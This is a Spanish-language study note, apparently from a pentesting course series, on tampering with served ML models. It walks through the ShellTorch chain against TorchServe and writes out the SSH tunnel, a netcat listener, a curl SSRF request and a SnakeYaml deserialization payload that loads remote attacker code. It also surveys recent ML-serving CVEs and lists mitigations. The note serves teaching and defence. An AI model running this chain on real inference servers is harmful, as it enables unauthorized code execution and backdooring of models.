---
tags:
  - IA/Red-Team
  - IA
  - Pentesting/Post-Explotacion
  - Pentesting/Explotacion
Descripción: "Si se llega al modelo servido o a sus datos de entrenamiento se puede modificar su comportamiento de forma persistente, y el modelo sigue pareciendo normal hasta que falla donde el atacante quiso"
Fecha de actualización: 2026-07-29
Nota previa: "[[05 - Manejo excesivo de datos y almacenamiento inseguro]]"
Nota siguiente: "[[07 - Vulnerabilidades en el stack de ML]]"
Area: "[[Aplicación y sistema.base|Aplicación y sistema]]"
---
---

<mark style="background: #ADCCFFA6;">Si se llega al modelo servido o a sus datos de entrenamiento, se puede modificar su comportamiento de forma persistente.</mark> Y a diferencia de casi cualquier otro backdoor, este es difícil de detectar porque <mark style="background: #FFB86CA6;">el modelo sigue pareciendo normal en las pruebas habituales y solo falla donde el atacante decidió</mark>. Es la materialización, en el componente de sistema, de los ataques de integridad que se estudian a bajo nivel en [[08 - Backdoors y trojans en modelos]].

# Dos caminos hacia el mismo resultado

| Vía | Cómo | Qué se manipula |
| - | - | - |
| **Tampering directo** | Acceso de escritura al artefacto del modelo | Pesos, sesgos, o el fichero entero se sustituye |
| **Tampering indirecto** | Acceso de escritura a los datos de entrenamiento | Se envenena el dataset y el modelo aprende el backdoor solo |

El directo es quirúrgico e inmediato: si una aplicación expone un endpoint que permite subir una nueva versión del modelo sin autenticación, se sube una manipulada y listo. El indirecto es `data poisoning` — más lento, requiere esperar al reentrenamiento, pero **sobrevive a que se reentrene el modelo** y es mucho más difícil de atribuir, porque el backdoor está disuelto en millones de muestras. El detalle a bajo nivel de esa vía está en [[00 - El pipeline de datos y su superficie de ataque|el sub-tema de ataques a los datos]].

<mark style="background: #8000E1A6;">Ambos parten de lo mismo: un control de acceso roto sobre el artefacto o sobre el almacén de datos.</mark> El tampering no es la vulnerabilidad; es lo que se hace **después** de encontrarla. Por eso esta nota es, en el fondo, sobre cómo se compromete la infraestructura que sirve el modelo.

# El caso de estudio: la cadena ShellTorch

HTB usa `ShellTorch` como ejemplo de compromiso de infraestructura que desemboca en tampering. La cadena es un buen ejemplo de encadenamiento de tres fallos, y conviene entenderla — con una advertencia de contexto importante que HTB no da.

> [!warning]+ TorchServe está archivado desde agosto de 2025
> El repositorio `pytorch/serve` fue **archivado el 7 de agosto de 2025** y está en estado *Limited Maintenance*: sin parches de seguridad, sin correcciones, sin nuevas versiones. El PyTorch ecosystem recomienda [`vLLM`](https://pytorch.org/blog/deploying-llms-with-torchserve-vllm/) para servir modelos en producción. Encontrar `TorchServe` en un engagement de 2026 es en sí mismo un hallazgo —software sin mantenimiento en producción— y todo lo que siga sin parche es explotable de forma permanente. La cadena `ShellTorch` sigue siendo válida como técnica; el producto que ataca es legado.

> [!info]+ Fuente: Oligo Security, [*ShellTorch*](https://www.oligo.security/blog/shelltorch-explained-multiple-vulnerabilities-in-pytorch-model-server) (2023)
> Tres fallos encadenados que llevan de acceso de red a RCE sin autenticar en `TorchServe`.

## Los tres eslabones

1. **API de gestión expuesta sin autenticación.** La guía de inicio rápido del repositorio oficial exponía la API de gestión en todas las interfaces (`0.0.0.0`), pese a que la documentación afirmaba que era solo local. Sin autenticación → acceso remoto no autorizado.
2. **SSRF en la carga de modelos** ([CVE-2023-43654](https://nvd.nist.gov/vuln/detail/cve-2023-43654)). El endpoint acepta una URL para descargar un modelo sin validarla, permitiendo apuntar a un servidor del atacante.
3. **Deserialización insegura** ([CVE-2022-1471](https://nvd.nist.gov/vuln/detail/cve-2022-1471)). La versión vulnerable usa `SnakeYaml`, susceptible a un gadget de deserialización que ejecuta código Java arbitrario desde un YAML malicioso.

## El flujo de explotación

El entorno se prepara con reenvío de puertos SSH para que el laboratorio pueda conectar de vuelta al sistema atacante:

```shell-session
$ ssh htb-stdnt@<SERVER_IP> -p <PORT> -R 8000:127.0.0.1:8000 -L 8081:127.0.0.1:8081 -N
```

Confirmar el acceso a la API de gestión (fallo 1) y el SSRF (fallo 2) con un listener:

```shell-session
$ nc -lnvp 8000
$ curl -X POST 'http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/ssrf'
```

El `payload` de deserialización es un gadget conocido de `marshalsec` que fuerza a `SnakeYaml` a cargar código Java desde el servidor del atacante:

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8000/"]]]]
```

Se empaqueta en un `.war` con `torch-workflow-archiver`, se sirve junto a una clase `ScriptEngineFactory` maliciosa que ejecuta el comando en su constructor, y se dispara vía el mismo SSRF apuntando al `.war`. El resultado es RCE en el servidor de inferencia. El detalle del gadget de `SnakeYaml` conecta con la familia de ataques de deserialización (el mismo principio que la [[11 - Pickle y la deserialización insegura de modelos|deserialización insegura de `pickle`]] en artefactos de modelo); el `marshalsec` es el arsenal equivalente para Java.

Con RCE en el servidor que sirve el modelo, el tampering directo es trivial: se reemplaza el artefacto por uno con backdoor, o se manipulan los datos de entrenamiento montados en ese host.

# El panorama 2026: dónde está hoy el ShellTorch

`ShellTorch` es de 2023 y sobre un producto muerto. El vector —**infraestructura de servido de modelos comprometida vía servicios expuestos sin autenticación**— está más vivo que nunca, solo que en otros productos. Estos son los objetivos actuales, todos con el mismo pecado original: se diseñaron asumiendo una red interna de confianza.

| Producto | Vulnerabilidad | Nota |
| - | - | - |
| **Ray** (Anyscale) | [CVE-2023-48022](https://www.sentinelone.com/vulnerability-database/cve-2023-48022/) — "ShadowRay". RCE sin auth vía la API de envío de trabajos | **Disputada** por el vendor: dice que la falta de auth es "por diseño". La botnet **ShadowRay 2.0** la explota activamente para criptominería y robo de modelos y credenciales. Puerto 8265 |
| **NVIDIA Triton** | [CVE-2026-24207](https://securityonline.info/nvidia-triton-inference-server-vulnerability-cve-2026-24207-authentication-bypass/) — bypass de autenticación, CVSS **9.8**, RCE sin auth ni interacción | Parcheado en el boletín de mayo de 2026, junto a 7 fallos más. Backend `DALI` con múltiples RCE (CVE-2026-24213/24214) |
| **vLLM** | [CVE-2025-30165](https://medium.com/@michael.hannecke/vllm-in-production-a-security-hardening-guide-for-enterprise-deployments-56a9c2c213dd) — RCE por deserialización de `pickle` en la comunicación `ZeroMQ` multinodo, CVSS 8.0 | Mitigado al hacer por defecto el motor V1; los despliegues con motor V0 siguen expuestos. CVE-2026-25960: bypass de SSRF por *parser differential* |
| **MLflow** | Familia de LFI→RCE | Nota propia: [[08 - MLflow, del path traversal al RCE]] |

<mark style="background: #FF5582A6;">El patrón que se reporta no es la CVE concreta, es la clase: "servicio del stack de ML alcanzable desde una red no confiable, sin autenticación o con una versión vulnerable conocida".</mark> Se encuentra con el escaneo de puertos de [[10 - Ataques a los componentes de sistema]] y se confirma con la versión. El caso ShadowRay es el aviso: cientos de clústeres Ray comprometidos porque el vendor considera que exponerlos sin auth es problema del operador, no del software.

# Detección y mitigación

La defensa vive en el entorno de despliegue y en toda la cadena de suministro:

- **Verificación de integridad del artefacto.** Hash o firma del modelo comprobados en el momento de la carga, no solo en el registro. `model-signing` de OpenSSF y `Sigstore` cierran el hueco de procedencia (ver [[15 - Arsenal de herramientas para ataques a los datos]]).
- **Control de acceso sobre el registro de modelos y sobre el almacén de datos de entrenamiento.** El endpoint que permite subir una versión de modelo es el activo más sensible del pipeline; sin autenticación fuerte y auditoría, es una puerta directa.
- **Parcheo agresivo del stack.** Runtime de contenedores, orquestador (Kubernetes), y framework de servido. La ventana entre publicación de CVE y explotación masiva de estos servicios se mide en días —ShadowRay lo demuestra.
- **Segmentación de red.** Los servicios de servido e inferencia no deberían ser alcanzables desde Internet ni desde segmentos de usuario. Es la mitigación que habría neutralizado ShellTorch, ShadowRay y la mitad de esta tabla.
- **`Secure build pipelines`** — CI/CD aislado, dependencias mínimas, `builds` reproducibles y escaneo automático de vulnerabilidades. Es lo que detiene el tampering en fase de construcción, antes de que llegue a producción.
- **Detección del backdoor en el propio modelo** — `Neural Cleanse`, análisis de activaciones (`ActivationDefence`): la última línea cuando el tampering ya ocurrió. Detalle en [[10 - Evaluación del trojan]] y [[14 - Detección y evasión en ataques a los datos]].
